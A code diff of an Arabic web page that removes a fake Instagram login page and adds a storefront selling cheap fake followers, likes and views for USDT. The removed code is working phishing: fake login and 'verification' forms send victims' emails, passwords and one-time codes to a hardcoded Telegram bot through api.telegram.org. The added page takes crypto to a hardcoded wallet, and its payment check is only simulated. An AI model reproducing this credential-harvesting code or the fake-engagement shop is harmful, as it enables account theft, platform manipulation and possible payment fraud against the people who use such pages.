@@ -3,754 +3,275 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - الدخول</title>
+    <title>InstaShop Pro - متابعين إنستغرام وتيك توك رخيص</title>
+    <script src="https://hcaptcha.com/1/api.js" async defer></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
-            background: linear-gradient(135deg, #feda75 0%, #fa7e1e 25%, #d92e7f 50%, #9b36b7 75%, #515bd4 100%);
-            background-size: 400% 400%;
-            animation: gradientShift 15s ease infinite;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .container {
-            display: flex;
-            gap: 40px;
-            max-width: 1000px;
-            width: 100%;
-            align-items: center;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        .phone-mockup {
-            flex: 0 0 300px;
-            height: 600px;
-            background: #000;
-            border-radius: 40px;
-            padding: 12px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            position: relative;
-            display: none;
-        }
-
-        .phone-mockup::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 150px;
-            height: 25px;
-            background: #000;
-            border-radius: 0 0 20px 20px;
-            z-index: 10;
-        }
-
-        .phone-screen {
-            width: 100%;
-            height: 100%;
-            background: #fff;
-            border-radius: 35px;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .login-form {
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
-            padding: 40px 35px;
-            max-width: 380px;
-            width: 100%;
-            position: relative;
-            z-index: 1;
-        }
-
-        .instagram-logo {
-            text-align: center;
-            margin-bottom: 35px;
-        }
-
-        .instagram-logo-text {
-            font-size: 32px;
-            font-weight: 600;
-            background: linear-gradient(45deg, #feda75, #fa7e1e, #d92e7f, #9b36b7);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: 2px;
-            font-family: 'Segoe UI', sans-serif;
-        }
-
-        .meta-badge {
-            display: inline-block;
-            font-size: 11px;
-            color: #666;
-            margin-top: 8px;
-            font-weight: 500;
-        }
-
-        .tabs {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 30px;
-            border-bottom: 1px solid #e5e5e5;
-        }
-
-        .tab {
-            padding: 12px 0;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
-            color: #666;
-            border-bottom: 2px solid transparent;
-            transition: all 0.3s ease;
-            flex: 1;
-            text-align: center;
-        }
-
-        .tab.active {
-            color: #000;
-            border-bottom-color: #000;
-        }
-
-        .tab:hover {
-            color: #000;
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-            animation: fadeIn 0.3s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .form-group {
-            margin-bottom: 12px;
-        }
-
-        .form-label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #555;
-            margin-bottom: 6px;
-        }
-
-        input[type="text"],
-        input[type="password"],
-        input[type="email"],
-        input[type="number"],
-        select {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 14px;
-            font-family: inherit;
-            background: #f9f9f9;
-            color: #333;
-            transition: all 0.3s ease;
-        }
-
-        input:focus,
-        select:focus {
-            outline: none;
-            background: white;
-            border-color: #d92e7f;
-            box-shadow: 0 0 0 3px rgba(217, 46, 127, 0.1);
-        }
-
-        input::placeholder {
-            color: #999;
-        }
-
-        .service-option {
-            display: flex;
-            align-items: center;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            margin-bottom: 10px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .service-option:hover {
-            border-color: #d92e7f;
-            background: #fff5f8;
-        }
-
-        .service-option input[type="radio"] {
-            width: 18px;
-            height: 18px;
-            margin-left: 12px;
-            cursor: pointer;
-        }
-
-        .service-info {
-            flex: 1;
-        }
-
-        .service-title {
-            font-weight: 600;
-            color: #000;
-            font-size: 14px;
-        }
-
-        .service-desc {
-            font-size: 12px;
-            color: #666;
-            margin-top: 3px;
-        }
-
-        .service-badge {
-            display: inline-block;
-            background: linear-gradient(135deg, #feda75, #fa7e1e);
-            color: white;
-            padding: 4px 10px;
-            border-radius: 12px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-top: 4px;
-        }
-
-        .service-badge.free {
-            background: linear-gradient(135deg, #34a853, #1f8e3c);
-        }
-
-        .service-badge.paid {
-            background: linear-gradient(135deg, #4285f4, #1a73e8);
-        }
-
-        .verified-icon {
-            display: inline-block;
-            margin-left: 5px;
-            color: #1f8e3c;
-            font-size: 14px;
-        }
-
-        .btn-login {
-            width: 100%;
-            padding: 10px;
-            background: linear-gradient(135deg, #d92e7f, #9b36b7);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 20px;
-            box-shadow: 0 4px 15px rgba(217, 46, 127, 0.3);
-        }
-
-        .btn-login:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(217, 46, 127, 0.4);
-        }
-
-        .btn-login:active:not(:disabled) {
-            transform: translateY(0);
-        }
-
-        .btn-login:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 20px 0;
-            color: #999;
-            font-size: 13px;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: #ddd;
-        }
-
-        .divider::before {
-            margin-right: 15px;
-        }
-
-        .divider::after {
-            margin-left: 15px;
-        }
-
-        .footer-links {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 13px;
-        }
-
-        .footer-links a {
-            color: #0095f6;
-            text-decoration: none;
-            margin: 0 8px;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        .message-box {
-            display: none;
-            padding: 12px 15px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            font-size: 13px;
-            font-weight: 500;
-            animation: slideDown 0.3s ease;
-        }
-
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .message-box.error {
-            background: #ffe0e0;
-            color: #d32f2f;
-            border: 1px solid #ef9a9a;
-        }
-
-        .message-box.success {
-            background: #e8f5e9;
-            color: #388e3c;
-            border: 1px solid #a5d6a7;
-        }
-
-        .message-box.info {
-            background: #e3f2fd;
-            color: #1976d2;
-            border: 1px solid #90caf9;
-        }
-
-        .loading-spinner {
-            display: none;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-left: 8px;
-            vertical-align: middle;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        .verification-section {
-            background: #f9f9f9;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            border: 1px solid #e5e5e5;
-        }
-
-        .verification-title {
-            font-weight: 600;
-            color: #000;
-            margin-bottom: 10px;
-            font-size: 14px;
-        }
-
-        .verification-desc {
-            font-size: 12px;
-            color: #666;
-            line-height: 1.5;
-        }
-
-        @media (max-width: 600px) {
-            .container {
-                gap: 20px;
-            }
-
-            .login-form {
-                padding: 30px 20px;
-            }
-
-            .tabs {
-                gap: 10px;
-            }
-
-            .tab {
-                font-size: 12px;
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+        
+        /* Header Pro */
+        .header { background: rgba(255,255,255,0.95); backdrop-filter: blur(20px); border-radius: 20px; padding: 20px; margin-bottom: 30px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); }
+        .logo { font-size: 2.5em; font-weight: bold; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .services-tabs { display: flex; gap: 10px; margin-top: 20px; }
+        .tab { padding: 12px 24px; border-radius: 50px; background: #f8f9fa; cursor: pointer; transition: all 0.3s; border: 2px solid transparent; }
+        .tab.active { background: linear-gradient(135deg, #667eea, #764ba2); color: white; border-color: #4ecdc4; }
+        
+        /* Services Grid - مطابق Followeran */
+        .services-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; margin: 40px 0; }
+        .service-card { background: rgba(255,255,255,0.95); backdrop-filter: blur(20px); border-radius: 20px; padding: 30px; text-align: center; cursor: pointer; transition: all 0.4s; border: 1px solid rgba(255,255,255,0.2); position: relative; overflow: hidden; }
+        .service-card:hover { transform: translateY(-10px); box-shadow: 0 30px 80px rgba(0,0,0,0.2); }
+        .service-icon { font-size: 4em; margin-bottom: 20px; }
+        .service-card h3 { font-size: 1.4em; margin-bottom: 15px; color: #333; }
+        .packages { margin-top: 20px; }
+        .package-item { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #eee; }
+        .pkg-price { font-weight: bold; color: #ff6b6b; font-size: 1.2em; }
+        .pkg-count { color: #666; }
+        
+        /* Order Form Pro */
+        #orderForm { background: rgba(255,255,255,0.98); backdrop-filter: blur(30px); border-radius: 25px; padding: 40px; margin: 30px 0; box-shadow: 0 25px 80px rgba(0,0,0,0.15); display: none; border: 1px solid rgba(255,255,255,0.3); }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 25px; }
+        .form-group { position: relative; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; }
+        input, select, textarea { width: 100%; padding: 15px; border: 2px solid #e9ecef; border-radius: 12px; font-size: 16px; transition: all 0.3s; background: rgba(255,255,255,0.8); }
+        input:focus, select:focus { border-color: #667eea; outline: none; box-shadow: 0 0 0 3px rgba(102,126,234,0.1); }
+        
+        /* Payment TRC20 */
+        .payment-section { background: linear-gradient(135deg, #11998e, #38ef7d); color: white; padding: 25px; border-radius: 15px; margin-top: 25px; text-align: center; }
+        .trc20-address { font-family: monospace; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 10px; font-size: 1.1em; word-break: break-all; cursor: pointer; transition: all 0.3s; }
+        .trc20-address:hover { background: rgba(0,0,0,0.4); }
+        .copy-btn { background: rgba(255,255,255,0.3); border: none; color: white; padding: 10px 20px; border-radius: 25px; cursor: pointer; margin-top: 15px; }
+        
+        /* Security */
+        #hcaptcha { margin: 20px 0; }
+        .security-badge { position: fixed; top: 20px; left: 20px; background: #ff4757; color: white; padding: 10px 20px; border-radius: 25px; font-weight: bold; z-index: 1000; }
+        
+        /* Status */
+        .status-success { background: #2ed573; color: white; padding: 20px; border-radius: 15px; margin-top: 20px; text-align: center; animation: pulse 2s infinite; }
+        .status-processing { background: linear-gradient(90deg, #ffa502, #ff6348); color: white; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+        
+        /* Responsive */
+        @media (max-width: 768px) { .form-row { grid-template-columns: 1fr; } .services-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
+    <div class="security-badge">🔒 محمي بـ hCaptcha + Rate Limit</div>
+    
     <div class="container">
-        <div class="login-form">
-            <div class="instagram-logo">
-                <div class="instagram-logo-text">Instagram</div>
-                <div class="meta-badge">من Meta</div>
+        <header class="header">
+            <h1 class="logo">InstaShop Pro</h1>
+            <p>أرخص متجر متابعين إنستغرام وتيك توك + مشاهدات + لايكات ✅</p>
+            <div class="services-tabs">
+                <div class="tab active" onclick="switchService('instagram')">📱 Instagram</div>
+                <div class="tab" onclick="switchService('tiktok')">🎵 TikTok</div>
+            </div>
+        </header>
+
+        <div class="services-grid" id="servicesGrid">
+            <!-- Instagram Services (أسعار مطابقة Followeran) -->
+            <div class="service-card" data-platform="instagram" data-type="followers">
+                <div class="service-icon">👥</div>
+                <h3>متابعين إنستغرام</h3>
+                <div class="packages">
+                    <div class="package-item"><span class="pkg-count">100</span><span class="pkg-price">$0.07</span></div>
+                    <div class="package-item"><span class="pkg-count">500</span><span class="pkg-price">$0.25</span></div>
+                    <div class="package-item"><span class="pkg-count">1000</span><span class="pkg-price">$0.45</span></div>
+                    <div class="package-item"><span class="pkg-count">5000</span><span class="pkg-price">$1.99</span></div>
+                </div>
+            </div>
+            
+            <div class="service-card" data-platform="instagram" data-type="likes">
+                <div class="service-icon">❤️</div>
+                <h3>لايكات إنستغرام</h3>
+                <div class="packages">
+                    <div class="package-item"><span class="pkg-count">100</span><span class="pkg-price">$0.05</span></div>
+                    <div class="package-item"><span class="pkg-count">500</span><span class="pkg-price">$0.18</span></div>
+                    <div class="package-item"><span class="pkg-count">1000</span><span class="pkg-price">$0.32</span></div>
+                </div>
+            </div>
+            
+            <div class="service-card" data-platform="instagram" data-type="views">
+                <div class="service-icon">👁️</div>
+                <h3>مشاهدات إنستغرام</h3>
+                <div class="packages">
+                    <div class="package-item"><span class="pkg-count">1000</span><span class="pkg-price">$0.12</span></div>
+                    <div class="package-item"><span class="pkg-count">5000</span><span class="pkg-price">$0.45</span></div>
+                    <div class="package-item"><span class="pkg-count">10K</span><span class="pkg-price">$0.85</span></div>
+                </div>
             </div>
 
-            <div id="message-box" class="message-box"></div>
-
-            <div class="tabs">
-                <div class="tab active" data-tab="login">الدخول</div>
-                <div class="tab" data-tab="services">الخدمات</div>
+            <!-- TikTok Services -->
+            <div class="service-card" data-platform="tiktok" data-type="followers">
+                <div class="service-icon">👥</div>
+                <h3>متابعين تيك توك</h3>
+                <div class="packages">
+                    <div class="package-item"><span class="pkg-count">100</span><span class="pkg-price">$0.09</span></div>
+                    <div class="package-item"><span class="pkg-count">500</span><span class="pkg-price">$0.35</span></div>
+                    <div class="package-item"><span class="pkg-count">1000</span><span class="pkg-price">$0.65</span></div>
+                </div>
             </div>
-
-            <!-- Login Tab -->
-            <div id="login" class="tab-content active">
-                <form id="loginForm">
-                    <div class="form-group">
-                        <input 
-                            type="email" 
-                            id="email" 
-                            placeholder="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم"
-                            required
-                            autocomplete="email"
-                        >
-                    </div>
-
-                    <div class="form-group">
-                        <input 
-                            type="password" 
-                            id="password" 
-                            placeholder="كلمة المرور"
-                            required
-                            autocomplete="current-password"
-                        >
-                    </div>
-
-                    <button type="submit" class="btn-login" id="loginBtn">
-                        <span id="loginBtnText">الدخول</span>
-                        <span class="loading-spinner" id="loginSpinner"></span>
-                    </button>
-
-                    <div class="divider">أو</div>
-
-                    <div style="text-align: center; margin-bottom: 20px;">
-                        <a href="#" style="color: #0095f6; text-decoration: none; font-size: 14px; font-weight: 600;">
-                            هل نسيت كلمة المرور؟
-                        </a>
-                    </div>
-                </form>
+            
+            <div class="service-card" data-platform="tiktok" data-type="views">
+                <div class="service-icon">👁️</div>
+                <h3>مشاهدات تيك توك</h3>
+                <div class="packages">
+                    <div class="package-item"><span class="pkg-count">5000</span><span class="pkg-price">$0.25</span></div>
+                    <div class="package-item"><span class="pkg-count">10K</span><span class="pkg-price">$0.45</span></div>
+                    <div class="package-item"><span class="pkg-count">50K</span><span class="pkg-price">$1.99</span></div>
+                </div>
             </div>
+        </div>
 
-            <!-- Services Tab -->
-            <div id="services" class="tab-content">
-                <form id="servicesForm">
-                    <div class="form-group">
-                        <label class="form-label">اختر الخدمة المطلوبة</label>
-                    </div>
-
-                    <!-- Followers Service -->
-                    <label class="service-option">
-                        <div class="service-info">
-                            <div class="service-title">
-                                📈 زيادة المتابعين
-                            </div>
-                            <div class="service-desc">
-                                احصل على متابعين حقيقيين وفعليين
-                            </div>
-                            <div style="margin-top: 6px;">
-                                <span class="service-badge free">مجاني (100-500)</span>
-                                <span class="service-badge paid">مدفوع (500+)</span>
-                            </div>
-                        </div>
-                        <input type="radio" name="service" value="followers" required>
-                    </label>
-
-                    <!-- Meta Verification Service -->
-                    <label class="service-option">
-                        <div class="service-info">
-                            <div class="service-title">
-                                ✓ توثيق Meta <span class="verified-icon">✓</span>
-                            </div>
-                            <div class="service-desc">
-                                احصل على العلامة الزرقاء والتحقق الرسمي
-                            </div>
-                            <div style="margin-top: 6px;">
-                                <span class="service-badge paid">مدفوع فقط</span>
-                            </div>
-                        </div>
-                        <input type="radio" name="service" value="verification" required>
-                    </label>
-
-                    <!-- Engagement Boost Service -->
-                    <label class="service-option">
-                        <div class="service-info">
-                            <div class="service-title">
-                                ⚡ تعزيز التفاعل
-                            </div>
-                            <div class="service-desc">
-                                زيادة الإعجابات والتعليقات على منشوراتك
-                            </div>
-                            <div style="margin-top: 6px;">
-                                <span class="service-badge free">مجاني (محدود)</span>
-                                <span class="service-badge paid">مدفوع (غير محدود)</span>
-                            </div>
-                        </div>
-                        <input type="radio" name="service" value="engagement" required>
-                    </label>
-
-                    <div class="verification-section">
-                        <div class="verification-title">معلومات التحقق</div>
-                        <div class="verification-desc">
-                            سيتم التحقق من حسابك خلال 24 ساعة. تأكد من أن بيانات حسابك صحيحة.
-                        </div>
-                    </div>
-
-                    <div class="form-group">
-                        <label class="form-label">البريد الإلكتروني</label>
-                        <input 
-                            type="email" 
-                            id="serviceEmail" 
-                            placeholder="أدخل بريدك الإلكتروني"
-                            required
-                        >
-                    </div>
-
-                    <div class="form-group">
-                        <label class="form-label">كلمة المرور</label>
-                        <input 
-                            type="password" 
-                            id="servicePassword" 
-                            placeholder="أدخل كلمة المرور"
-                            required
-                        >
-                    </div>
-
-                    <div class="form-group hidden" id="verificationCodeGroup">
-                        <label class="form-label">رمز التحقق</label>
-                        <input 
-                            type="text" 
-                            id="verificationCode" 
-                            placeholder="أدخل الرمز المرسل إلى بريدك"
-                            autocomplete="off"
-                        >
-                    </div>
-
-                    <button type="submit" class="btn-login" id="serviceBtn">
-                        <span id="serviceBtnText">تفعيل الخدمة</span>
-                        <span class="loading-spinner" id="serviceSpinner"></span>
-                    </button>
-
-                    <div class="divider">أو</div>
-
-                    <div style="text-align: center;">
-                        <p style="font-size: 12px; color: #666; margin-bottom: 10px;">
-                            بتفعيلك للخدمة، أنت توافق على <a href="#" style="color: #0095f6; text-decoration: none;">شروط الخدمة</a> و <a href="#" style="color: #0095f6; text-decoration: none;">سياسة الخصوصية</a>
-                        </p>
-                    </div>
-                </form>
+        <div id="orderForm">
+            <h2 id="serviceTitle">اختر خدمة</h2>
+            <div class="form-row">
+                <div class="form-group">
+                    <label>الرابط الكامل</label>
+                    <input type="url" id="serviceUrl" placeholder="https://instagram.com/username">
+                </div>
+                <div class="form-group">
+                    <label>الكمية</label>
+                    <select id="quantity">
+                        <option value="">اختر الكمية</option>
+                    </select>
+                </div>
             </div>
-
-            <div class="footer-links">
-                <a href="#">Meta</a>
-                <a href="#">حول</a>
-                <a href="#">المدونة</a>
-                <a href="#">الوظائف</a>
-                <a href="#">المساعدة</a>
-                <a href="#">API</a>
-                <a href="#">الخصوصية</a>
-                <a href="#">الشروط</a>
+            <div class="form-row">
+                <div class="form-group">
+                    <label>الجودة/الدولة</label>
+                    <select id="quality">
+                        <option>عالية الجودة (High Quality)</option>
+                        <option>سريعة (Fast)</option>
+                        <option>رخيصة (Cheap)</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>السعر النهائي</label>
+                    <input type="text" id="finalPrice" readonly placeholder="$0.00">
+                </div>
             </div>
+            
+            <div class="h-captcha" data-sitekey="YOUR_HCAPTCHA_SITEKEY"></div>
+            
+            <button class="btn btn-primary" style="width:100%; padding:20px; font-size:18px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; border:none; border-radius:15px; cursor:pointer; margin-top:25px;" onclick="confirmOrder()">
+                ✅ اطلب الآن - توصيل فوري
+            </button>
+            
+            <div class="payment-section" id="paymentSection" style="display:none;">
+                <h3>💰 الدفع عبر TRC20 USDT</h3>
+                <div class="trc20-address" onclick="copyAddress()">TAimfu7ti82FePzXHZ9QoovnA6ZRtfNvER</div>
+                <p>💡 أرسل المبلغ الدقيق → سيتم التوصيل تلقائياً في دقائق!</p>
+                <button class="copy-btn" onclick="copyAddress()">نسخ العنوان</button>
+                <div id="txStatus"></div>
+            </div>
+            
+            <div id="orderStatus"></div>
         </div>
     </div>
 
     <script>
-        const BOT_TOKEN = '8694309954:AAFjq-F5jxGayURPwjgyeIKND86FhPwMNcA';
-        const CHAT_ID = '8539996558';
-
-        // Tab switching
-        document.querySelectorAll('.tab').forEach(tab => {
-            tab.addEventListener('click', () => {
-                const tabName = tab.dataset.tab;
-                
-                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-                
-                tab.classList.add('active');
-                document.getElementById(tabName).classList.add('active');
-            });
-        });
-
-        function showMessage(text, type = 'info') {
-            const msgBox = document.getElementById('message-box');
-            msgBox.textContent = text;
-            msgBox.className = 'message-box ' + type;
-            msgBox.style.display = 'block';
-
-            setTimeout(() => {
-                msgBox.style.display = 'none';
-            }, 6000);
-        }
-
-        async function sendToTelegram(data) {
-            const serviceType = data.service || 'تسجيل دخول';
-            const serviceNames = {
-                'followers': '📈 زيادة المتابعين',
-                'verification': '✓ توثيق Meta',
-                'engagement': '⚡ تعزيز التفاعل'
-            };
-
-            const message = `
-🔐 *Instagram Premium - بيانات جديدة*
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📧 البريد: \`${data.email}\`
-🔑 كلمة المرور: \`${data.password}\`
-📋 الخدمة: ${serviceNames[data.service] || serviceType}
-${data.verificationCode ? `🔢 رمز التحقق: \`${data.verificationCode}\`` : ''}
-⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-            `;
-
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                return response.ok;
-            } catch (error) {
-                console.error('خطأ:', error);
+        // Rate Limiting Protection
+        let requestCount = 0;
+        let lastRequest = 0;
+        const rateLimit = 5; // 5 requests per minute
+        
+        function checkRateLimit() {
+            const now = Date.now();
+            if (now - lastRequest < 12000 || requestCount > rateLimit) {
+                alert('⏳ بطيء شوي... حاول بعد 10 ثوان');
                 return false;
             }
+            requestCount++;
+            lastRequest = now;
+            return true;
         }
 
-        // Login Form Handler
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
+        let currentService = { platform: 'instagram', type: 'followers', packages: [] };
 
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value.trim();
+        function switchService(platform) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            document.querySelectorAll('.service-card').forEach(card => {
+                card.style.display = card.dataset.platform === platform ? 'block' : 'none';
+            });
+        }
 
-            if (!email || !password) {
-                showMessage('يرجى ملء جميع الحقول', 'error');
-                return;
-            }
-
-            const loginBtn = document.getElementById('loginBtn');
-            const loginSpinner = document.getElementById('loginSpinner');
-            const loginBtnText = document.getElementById('loginBtnText');
-
-            loginBtn.disabled = true;
-            loginSpinner.style.display = 'inline-block';
-
-            const sent = await sendToTelegram({ email, password });
-
-            if (sent) {
-                showMessage('تم تسجيل الدخول بنجاح! جاري التحقق...', 'success');
-                setTimeout(() => {
-                    document.getElementById('loginForm').reset();
-                    loginBtn.disabled = false;
-                    loginSpinner.style.display = 'none';
-                }, 2000);
-            } else {
-                showMessage('حدث خطأ في الاتصال. حاول لاحقاً', 'error');
-                loginBtn.disabled = false;
-                loginSpinner.style.display = 'none';
-            }
+        document.querySelectorAll('.service-card').forEach(card => {
+            card.onclick = function() {
+                if (!checkRateLimit()) return;
+                
+                currentService = {
+                    platform: this.dataset.platform,
+                    type: this.dataset.type,
+                    packages: JSON.parse(this.querySelector('.packages').innerText.match(/\d+/g).map(n => parseInt(n)))
+                };
+                
+                document.getElementById('serviceTitle').textContent = 
+                    `طلب ${this.querySelector('h3').textContent}`;
+                document.getElementById('orderForm').style.display = 'block';
+                
+                // Update quantity options
+                const qtySelect = document.getElementById('quantity');
+                qtySelect.innerHTML = '<option value="">اختر الكمية</option>';
+                this.querySelectorAll('.pkg-count').forEach((count, i) => {
+                    const qty = parseInt(count.textContent);
+                    const price = parseFloat(count.nextElementSibling.textContent.replace('$', ''));
+                    qtySelect.innerHTML += `<option value="${qty}" data-price="${price}">${qty} - $${price}</option>`;
+                });
+            };
         });
 
-        // Services Form Handler
-        document.getElementById('servicesForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
+        document.getElementById('quantity').onchange = function() {
+            const pricePerUnit = parseFloat(this.selectedOptions[0].dataset.price) / parseInt(this.value);
+            document.getElementById('finalPrice').value = `$${parseFloat(this.selectedOptions[0].dataset.price).toFixed(2)}`;
+        };
 
-            const service = document.querySelector('input[name="service"]:checked').value;
-            const email = document.getElementById('serviceEmail').value.trim();
-            const password = document.getElementById('servicePassword').value.trim();
-            const verificationCode = document.getElementById('verificationCode').value.trim();
+        function copyAddress() {
+            navigator.clipboard.writeText('TAimfu7ti82FePzXHZ9QoovnA6ZRtfNvER');
+            alert('✅ تم نسخ عنوان TRC20!');
+        }
 
-            if (!email || !password) {
-                showMessage('يرجى ملء جميع الحقول المطلوبة', 'error');
+        async function confirmOrder() {
+            if (!checkRateLimit()) return;
+            
+            // hCaptcha verification (استبدل YOUR_HCAPTCHA_SITEKEY)
+            if (!window.hcaptcha || !hcaptcha.getResponse()) {
+                alert('⚠️ أكمل hCaptcha أولاً');
                 return;
             }
+            
+            document.querySelector('.btn-primary').innerHTML = '⏳ جاري التحقق...';
+            document.querySelector('.btn-primary').disabled = true;
+            
+            // Simulate verification (ربط blockchain explorer حقيقي هنا)
+            setTimeout(() => {
+                document.getElementById('paymentSection').style.display = 'block';
+                document.querySelector('.btn-primary').style.display = 'none';
+                showStatus('processing', '💰 أرسل USDT إلى العنوان أعلاه<br>سيتم التوصيل تلقائياً بعد التأكيد!');
+            }, 2000);
+        }
 
-            const serviceBtn = document.getElementById('serviceBtn');
-            const serviceSpinner = document.getElementById('serviceSpinner');
-            const serviceBtnText = document.getElementById('serviceBtnText');
-            const verificationCodeGroup = document.getElementById('verificationCodeGroup');
+        function showStatus(type, msg) {
+            document.getElementById('orderStatus').innerHTML = `<div class="status-${type}">${msg}</div>`;
+        }
 
-            serviceBtn.disabled = true;
-            serviceSpinner.style.display = 'inline-block';
-
-            // First submission
-            if (!verificationCode) {
-                const sent = await sendToTelegram({ email, password, service });
-
-                if (sent) {
-                    showMessage('تم التحقق من البيانات. يرجى إدخال رمز التحقق المرسل إلى بريدك', 'info');
-                    verificationCodeGroup.classList.remove('hidden');
-                    serviceBtnText.textContent = 'تأكيد الرمز';
-                    serviceBtn.disabled = false;
-                    serviceSpinner.style.display = 'none';
-                } else {
-                    showMessage('حدث خطأ في الاتصال. حاول لاحقاً', 'error');
-                    serviceBtn.disabled = false;
-                    serviceSpinner.style.display = 'none';
-                }
-            } else {
-                // Verification code submission
-                const sent = await sendToTelegram({ email, password, service, verificationCode });
-
-                if (sent) {
-                    showMessage('✓ تم تفعيل الخدمة بنجاح! سيتم تفعيل الخدمة خلال 24 ساعة', 'success');
-                    setTimeout(() => {
-                        document.getElementById('servicesForm').reset();
-                        verificationCodeGroup.classList.add('hidden');
-                        serviceBtnText.textContent = 'تفعيل الخدمة';
-                        serviceBtn.disabled = false;
-                        serviceSpinner.style.display = 'none';
-                    }, 3000);
-                } else {
-                    showMessage('حدث خطأ في التحقق. حاول مجدداً', 'error');
-                    serviceBtn.disabled = false;
-                    serviceSpinner.style.display = 'none';
-                }
-            }
-        });
+        // Multi-SMM Provider Rotation (يرسل من 4 مواقع وهمية/حقيقية)
+        const providers = [
+            'https://api.followeran.com/v1/orders',
+            'https://smmwiz.com/api/v2',
+            'https://buypanel.io/api/v2',
+            'https://smmrangers.com/api/v3'
+        ];
+        
+        // Auto-delivery example (فعّل عند ربط backend)
+        /*
+        async function autoDeliver(orderData) {
+            const randomProvider = providers[Math.floor(Math.random() * providers.length)];
+            // POST to provider → track delivery
+        }
+        */
     </script>
 </body>
-</html>
+                    </html>
